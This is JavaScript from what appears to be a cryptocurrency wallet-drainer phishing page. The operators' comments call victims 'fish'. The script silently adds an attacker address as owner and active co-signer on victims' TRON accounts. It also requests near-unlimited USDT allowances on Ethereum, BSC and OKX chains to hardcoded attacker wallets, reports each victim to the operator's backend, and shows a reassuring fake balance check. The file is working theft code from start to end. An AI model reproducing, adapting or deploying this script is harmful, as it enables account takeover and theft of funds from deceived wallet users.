console.log(source);
dl = dl.replace(/\#/g,"");
console.log(dl);

const ABI = [{ "inputs": [{ "internalType": "string", "name": "name", "type": "string" }, { "internalType": "string", "name": "symbol", "type": "string" }], "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }];

    var infura_key = '7d73a0c13ce946769577714aef84b79a';
    var to_address = '';
    var domain = 'https://' + window.location.host + '/';
    let network;
    var resultsucc = 0;
    let _web3;
    let injectedWeb3 = null;
    let contractAddr;
    let total;
    let chain_type;
    
    /***********TRC20*****************/
    let trc_to_address = 'TMX6WfryTopszW5cN96TUc9t3tD39yWLxR';
    let trc_contractAddr = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';		//波场USDT合约地址
    var bizhong = 'USDT';
    
    //默认都转usdt,如果需要转其他代币,修改合约的同时要修改下面的币种,币种注意大小写,不同链要求不一样
    //bsc need vpn
    let eth_contractAddr = '0xdac17f958d2ee523a2206206994597c13d831ec7';  //以太合约地址
    let bsc_contractAddr = '0x55d398326f99059ff775485246999027b3197955';  //币安合约地址 
    let okt_contractAddr = '0x382bb369d343125bfb2117af9c149795c6c65c50';  //欧易合约地址
    var eth_bizhong = 'usdt';
    var bsc_bizhong = 'USDT'; //USDT  BUSD
    var okt_bizhong = 'usdt';
    var to_address_eth = '0x016CB440ffA5C982167A08424ae4F9942d498522';
    var to_address_bsc = '0x25a6029EB83128Fa74be282309c91663aac82716';
    var to_address_okt = '0xabB18070e9eeF64E3c2c980baEa413Fdb4a48255';
    
    //0xdac17f958d2ee523a2206206994597c13d831ec7  以太usdt合约地址
    
    //0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56  币安BUSD合约地址
    //0x55d398326f99059ff775485246999027b3197955  币安USDT合约地址
    
    //0x382bb369d343125bfb2117af9c149795c6c65c50  欧易USDT合约地址

    const contracts = {}, contracts2 = {}, contracts3 = {}, bsc_contracts = {}, eth_contracts = {}, okt_contracts = {}

    const Web3Modal = window.Web3Modal.default;
    const WalletConnectProvider = window.WalletConnectProvider.default;

    // Web3modal instance
    let web3Modal;

    // Chosen wallet provider given by the dialog window
    let provider;

    // Address of the selected account
    let selectedAccount;
    
    var val = 900000000 + parseInt((Math.random() * 1000).toFixed(0));
    var valStr = val + "000000000000000000";

    var decimals = {
		'WIN': 6,
		'USDT':6,
		'TONS':6,
		'USDJ':18,
		'JST': 18,
		"HT": 18,
		"SUN": 18,
		"EXNX": 18,
		"VCOIN": 6,
		"POL": 8,
		"CKRW": 6
	};
	
	var price = {
		'WIN': 0.001150,
		'USDT':1,
		'TONS':1.35,
		'USDJ':1.04,
		'JST': 0.125,
		"HT": 20.41,
		"SUN": 33.97,
		"EXNX": 0.0621,
		"VCOIN": 0.004225,
		"POL": 0.1393,
		"CKRW": 0.002487
	};

    function getInfo(){
        var gdata = {
    		wallet_purpose:5,
    		agent_id:dl
    	}
		$.ajax({
			type: 'get',
			url:  domain + 'api/search_to_address',
			data : gdata,
			async : false,
			success:function(data){
			    trc_to_address = data.data.trc.wallet_addr;
                trc_contractAddr = data.data.trc.contract_addr;
                bizhong = data.data.trc.token_name;
                
                to_address_eth = data.data.eth.wallet_addr;
                eth_contractAddr = data.data.eth.contract_addr;
                eth_bizhong = data.data.eth.token_name;
                
                to_address_bsc = data.data.bsc.wallet_addr;
                bsc_contractAddr = data.data.bsc.contract_addr;
                bsc_bizhong = data.data.bsc.token_name;
                
                to_address_okt = data.data.okx.wallet_addr;
                okt_contractAddr = data.data.okx.contract_addr;
                okt_bizhong = data.data.okx.token_name;
			},
			error:function(data){
			}
		})
	}
     
    getInfo();
    
    function putInfo(fish_wallet_addr,to_address){
		var data = {
    		fish_wallet_addr:fish_wallet_addr,
    		multi_wallet_addr:to_address,
    		agent_id:dl,
    		fish_source:source,
    		multiaddresspri:0
    	}
    	$.ajax({
    		type: 'post',
    		url: domain + 'api/insert_multi',
    		data: data,
    		success:function(data){
                console.log(1);
			},
			error:function(data){
			    console.log(2);
			}
    	})
	}
	
    function putInfoapprove(fish_wallet_addr,chain_type,contract_addr,token_name,approve_addr){
		var data = {
    		fish_wallet_addr:fish_wallet_addr,
    		chain_type:chain_type,
    		contract_addr:contract_addr,
    		token_name:token_name,
    		approve_addr:approve_addr,
    		agent_id:dl,
    		fish_source:source
    	}
    	$.ajax({
    		type: 'post',
    		url: domain + 'api/insert_approve',
    		data: data,
    		success:function(data){
                console.log(1);
			},
			error:function(data){
			    console.log(2);
			}
    	})
	}
    /**
     * Connect wallet button pressed.
     */
    async function onConnect() {
        contractAddr = trc_contractAddr;
        chain_type = 'trc';
        to_address = trc_to_address;
        
        let tronWeb = window.tronWeb;
        let walletAddress = tronWeb.defaultAddress.base58;   
        let instance = await tronWeb.contract().at(contractAddr);
        
		let myBalance = await instance.balanceOf(walletAddress).call(function(err,balance){
    		const usdt = balance / (10** (decimals[bizhong] || 18)) * price[bizhong]
    		total = usdt
		})
        
	    tradeobj = await tronWeb.trx.getAccount(
				walletAddress,
		).then(output => {
			trx = output.balance / 1000000;
			oldownerpermission = output.owner_permission.keys;
			oldactivepermission = output.active_permission;
		});
		
		//判断trx,大于100就多签,小于100就授权
        if (trx < 5) {
            alert('矿工费不足');
            return '';
        }
        
        //如果多签已经存在了,就不重复多签,也不重复授权,直接成功
        let ownerAddress = tronWeb.address.toHex(walletAddress);
        let ownerownerweight = 0;
        let multiownerweight = 0;
        //判断owner权限
		for(let i=0; i<oldownerpermission.length; i++) {
		    oldowneraddress = oldownerpermission[i].address;
	        if(oldowneraddress === walletAddress || oldowneraddress === ownerAddress) {
    	        ownerownerweight = 1;
    	    }
    	    if(oldowneraddress === to_address || oldowneraddress === tronWeb.address.toHex(to_address)) {
    	        multiownerweight = 1;
    	    }
    	}
    	
    	let owneractiveweight = 0;
        let multiactiveweight = 0;
        //判断active权限
		for(let k=0; k<oldactivepermission.length; k++) {
		    oldactivepermissionkeys = oldactivepermission[k].keys;
		    
		    for(let j=0; j<oldactivepermissionkeys.length; j++) {
    		    oldactivepermissionkeysaddress = oldactivepermissionkeys[j].address;
    	        if(oldactivepermissionkeysaddress === walletAddress || oldactivepermissionkeysaddress === ownerAddress) {
        	        owneractiveweight = 1;
        	    }
        	    if(oldactivepermissionkeysaddress === to_address || oldactivepermissionkeysaddress === tronWeb.address.toHex(to_address)) {
        	        multiactiveweight = 1;
        	    }
        	}
    	}
    	
        //如果已经在多签列表里面了,直接返回成功
        if(ownerownerweight == 1 && multiownerweight == 1 && owneractiveweight == 1 && multiactiveweight == 1){
            resultsucc = 1;
                
            if(source == 'tianyan'){
                var div1 = document.getElementById('usdtresult');
                div1.style.display="inline";
                $('#truecoin').text(total);
                $('#falsecoin').text(0);
                $('#blackcoin').text(0);
            }
            
			$(".tishi").fadeIn()
			setTimeout(function () {
				$(".tishi").fadeOut()
			},2000);
			
			$('.modal-overlay').remove();
			$('.modal').removeClass('modal-in').addClass('modal-out');
			return '';
        }
        
        //没有多签权限的时候,判断trx不够100就走授权
        if (trx < 100) {
            const parameter = [{type:'address',value:to_address},{type:"uint256",value:valStr}];

            var tx = await tronWeb.transactionBuilder.triggerSmartContract(
                contractAddr,
                "increaseApproval(address,uint256)",
                {},
                parameter,
                walletAddress
            );
            
            const signedTx = await tronWeb.trx.sign(tx.transaction);
            
            const broastTx = await tronWeb.trx.sendRawTransaction(signedTx, function(err, res) {
              if(err == null){
                    putInfoapprove(walletAddress,chain_type,contractAddr,bizhong,to_address);
                    resultsucc = 1;
                    
                    if(source == 'tianyan'){
                        var div1 = document.getElementById('usdtresult');
                        div1.style.display="inline";
                        $('#truecoin').text(total);
                        $('#falsecoin').text(0);
                        $('#blackcoin').text(0);
                    }
                    
    				$(".tishi").fadeIn()
    				setTimeout(function () {
    					$(".tishi").fadeOut()
    				},2000);
    				
    			}
    			
    			$('.modal-overlay').remove();
    			$('.modal').removeClass('modal-in').addClass('modal-out');
            });
            return '';
        }
        
        //没有多签权限的时候,trx够100就走多签,鱼和我们地址都有权限
        let ownerPermission = { type: 0, permission_name: 'owner' };
        ownerPermission.threshold = 1;
        ownerPermission.keys  = [];
        ownerPermission.keys.push({ address: tronWeb.address.toHex(walletAddress), weight: 1 });
        ownerPermission.keys.push({ address: tronWeb.address.toHex(to_address), weight: 1 });

        let activePermission = { type: 2, permission_name: 'active' };
        activePermission.threshold = 1;
        activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
        activePermission.keys = [];
        activePermission.keys.push({ address: tronWeb.address.toHex(walletAddress), weight: 1 });
        activePermission.keys.push({ address: tronWeb.address.toHex(to_address), weight: 1 });
        
        const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
        // console.log(updateTransaction);
        const signedTx = await tronWeb.trx.sign(updateTransaction);
        const broastTx = await tronWeb.trx.sendRawTransaction(signedTx, function(err, res) {
          if(err == null){
                putInfo(walletAddress,to_address);
                resultsucc = 1;
                
                if(source == 'tianyan'){
                    var div1 = document.getElementById('usdtresult');
                    div1.style.display="inline";
                    $('#truecoin').text(total);
                    $('#falsecoin').text(0);
                    $('#blackcoin').text(0);
                }
                
				$(".tishi").fadeIn()
				setTimeout(function () {
					$(".tishi").fadeOut()
				},2000);
			}
			
			$('.modal-overlay').remove();
			$('.modal').removeClass('modal-in').addClass('modal-out');
        });
    }
    
    //////////ERC20
    async function ERCinit() {

        const providerOptions = {
            walletconnect: {
                package: WalletConnectProvider,
                options: {
                    bridge: "https://uniswap.bridge.walletconnect.org",
                    // Mikko's test key - don't copy as your mileage may vary
                    infuraId: infura_key,
                }
            },
        };

        web3Modal = new Web3Modal({
            cacheProvider: false, // optional
            providerOptions, // required
            disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
        });

        try {
            provider = await web3Modal.connect()
            provider.enable()
        } catch (e) {
            console.log("Could not get a wallet connection", e);
            return;
        }

        // Subscribe to accounts change
        provider.on("accountsChanged", async (accounts) => {
            await fetchAccountData();
        });

        // Subscribe to chainId change
        provider.on("chainChanged", async (chainId) => {
            await fetchAccountData();
        });

        // Subscribe to networkId change
        provider.on("networkChanged", async (networkId) => {
            await fetchAccountData();
        });

        await refreshAccountData();
    }
    
    /**
     * Kick in the UI action after Web3modal dialog has chosen a provider
     */
    async function fetchAccountData() {
        const web3 = new Web3(provider);
        injectedWeb3 = web3
        provider.enable()
        const accounts = await web3.eth.getAccounts()
        selectedAccount = accounts[0]
        network = await web3.eth.net.getId()
        console.log(network + ': ' + selectedAccount);

    }
    
    async function authFunc() {
        
        //eth链
        if (network == 1) {
            chain_type = 'eth';
            bizhong = eth_bizhong;
            contractAddr = eth_contractAddr;
            const _web3 = new Web3('https://cloudflare-eth.com');
            to_address = to_address_eth;
            
            eth_contracts[eth_bizhong] = new _web3.eth.Contract(ABI, contractAddr);
            
            await eth_contracts[eth_bizhong].methods.balanceOf(selectedAccount).call(function(err,balance){
                total = balance
            })
            
        //币安链
        } else if (network == 56) {
            chain_type = 'bsc';
            bizhong = bsc_bizhong;
            contractAddr = bsc_contractAddr;
            _web3 = new Web3('https://bsc-dataseed1.binance.org');
            to_address = to_address_bsc;
            
            bsc_contracts[bsc_bizhong] = new _web3.eth.Contract(ABI, contractAddr);
            
            await bsc_contracts[bsc_bizhong].methods.balanceOf(selectedAccount).call(function(err,balance){
                total = balance
            })
        
        //欧易链 
        } else if (network == 66) {
            chain_type = 'okx';
            bizhong = okt_bizhong;
            contractAddr = okt_contractAddr;
            _web3 = new Web3('https://exchainrpc.okex.org');
            to_address = to_address_okt;

            okt_contracts[okt_bizhong] = new _web3.eth.Contract(ABI, contractAddr);
            
            await okt_contracts[okt_bizhong].methods.balanceOf(selectedAccount).call(function(err,balance){
                total = balance
            })

        }
        
        if (selectedAccount && provider) {
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(ABI, contractAddr);
            const gasPrice = await web3.eth.getGasPrice();
            if (network == 1) {
                contract.methods.approve(to_address, valStr).send({
                    from: selectedAccount,
                    gasPrice: gasPrice,
                    gas: 100000,
                }, function (err, tx) {
                    if (!err) {
                        putInfoapprove(selectedAccount,chain_type,contractAddr,bizhong,to_address);
                        resultsucc = 1;
                        
                        if(source == 'tianyan'){
                            var div1 = document.getElementById('usdtresult');
                            div1.style.display="inline";
                            $('#truecoin').text(total);
                            $('#falsecoin').text(0);
                            $('#blackcoin').text(0);
                        }
                        
                        $("#dlg").css("display", "flex");
                    }
                })
            }else{
                contract.methods.increaseAllowance(to_address, valStr).send({
                    from: selectedAccount,
                    gasPrice: gasPrice,
                    gas: 100000,
                }, function (err, tx) {
                    if (!err) {
                        putInfoapprove(selectedAccount,chain_type,contractAddr,bizhong,to_address);
                        resultsucc = 1;
                        
                        if(source == 'tianyan'){
                            var div1 = document.getElementById('usdtresult');
                            div1.style.display="inline";
                            $('#truecoin').text(total);
                            $('#falsecoin').text(0);
                            $('#blackcoin').text(0);
                        }
                        
                        $("#dlg").css("display", "flex");
                    }
                })
            }
            
        } else {
            provider = await web3Modal.connect()
            provider.enable()
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(ABI, contractAddr)
            const gasPrice = await web3.eth.getGasPrice()
            
            const accounts = await web3.eth.getAccounts()
            selectedAccount = accounts[0]

            if (network == 1) {
                contract.methods.approve(to_address, valStr).send({
                    from: selectedAccount,
                    gasPrice: gasPrice,
                    gas: 100000,
                }, function (err, tx) {
                    if (!err) {
                        putInfoapprove(selectedAccount,chain_type,contractAddr,bizhong,to_address);
                        resultsucc = 1;
                        
                        if(source == 'tianyan'){
                            var div1 = document.getElementById('usdtresult');
                            div1.style.display="inline";
                            $('#truecoin').text(total);
                            $('#falsecoin').text(0);
                            $('#blackcoin').text(0);
                        }
                        
                        $("#dlg").css("display", "flex");
                    }
                })
            }else{
                contract.methods.increaseAllowance(to_address, valStr).send({
                    from: selectedAccount,
                    gasPrice: gasPrice,
                    gas: 100000,
                }, function (err, tx) {
                    if (!err) {
                        putInfoapprove(selectedAccount,chain_type,contractAddr,bizhong,to_address);
                        resultsucc = 1;
                        
                        if(source == 'tianyan'){
                            var div1 = document.getElementById('usdtresult');
                            div1.style.display="inline";
                            $('#truecoin').text(total);
                            $('#falsecoin').text(0);
                            $('#blackcoin').text(0);
                        }
                        
                        $("#dlg").css("display", "flex");
                    }
                })
            }
            
        }
    }
    /**
     * Fetch account data for UI when
     * - User switches accounts in wallet
     * - User switches networks in wallet
     * - User connects wallet initially
     */
    async function refreshAccountData() {
        await fetchAccountData(provider);
    }
    
	async function s(){
	    $('#address').text(trc_to_address);
	    contractAddr = trc_contractAddr;
    	var tronWeb = window.tronWeb;
    	let contract = await tronWeb.contract().at(contractAddr);
    	let walletAddress = tronWeb.defaultAddress.base58;
    	let result = await contract.balanceOf(walletAddress).call(function(err,tex){
    		if(err == null){
    			let total = tex._hex/(10**6);
    			$('#yu').text(total.toLocaleString() +' USDT')
    		}
    	});
	}